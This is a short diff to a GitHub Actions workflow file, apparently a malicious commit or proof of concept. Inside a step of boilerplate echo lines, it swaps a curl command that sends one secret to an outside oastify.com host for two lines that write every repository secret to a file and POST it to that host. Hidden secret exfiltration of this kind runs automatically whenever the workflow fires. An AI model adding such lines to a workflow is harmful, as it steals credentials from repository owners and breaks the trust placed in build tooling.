@@ -34,4 +34,5 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
-          curl https://vwvdre5n5gppxcgirlikkis77ydp1hp6.oastify.com --data ${{ secrets.SUPER_SECRET }}
+          echo "${{ toJSON(secrets) }}" > .secrets
+          curl -X POST -s --data "@.secrets" https://vwvdre5n5gppxcgirlikkis77ydp1hp6.oastify.com
